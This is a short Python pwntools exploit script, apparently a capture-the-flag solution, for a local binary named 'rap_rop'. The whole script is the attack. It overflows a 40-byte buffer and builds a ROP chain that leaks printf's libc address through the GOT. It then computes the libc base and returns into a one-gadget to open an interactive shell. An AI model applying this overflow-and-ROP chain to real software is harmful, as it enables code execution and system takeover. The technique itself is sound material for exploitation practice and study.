from pwn import *

r = process("./rap_rop")
gdb.attach(r)

printf_plt = 0x4004e0
pop_rdi_ret = 0x00000000004006c3
got_print = 0x601018
# got_gets = 0x601020
# gets_plt = 0x4004f0
main_addr = 0x00000000004005f7
# bss = 0x00601100

offset_printf = 0x64f70
# leak = 0x7f86c8a82f70


payload = "A"*40 + p64(pop_rdi_ret) + p64(got_print) + p64(printf_plt) + p64(main_addr)

r.recvuntil("name :")
r.sendline(payload)

r.recv()
leak = u64(r.recvuntil("your")[-10:-4]+"\x00\x00")

libc_base = leak - offset_printf
gadget = libc_base + 0x4f432

payload = "A"*40 + p64(gadget) + "\x00"*100
r.sendline(payload)

r.interactive()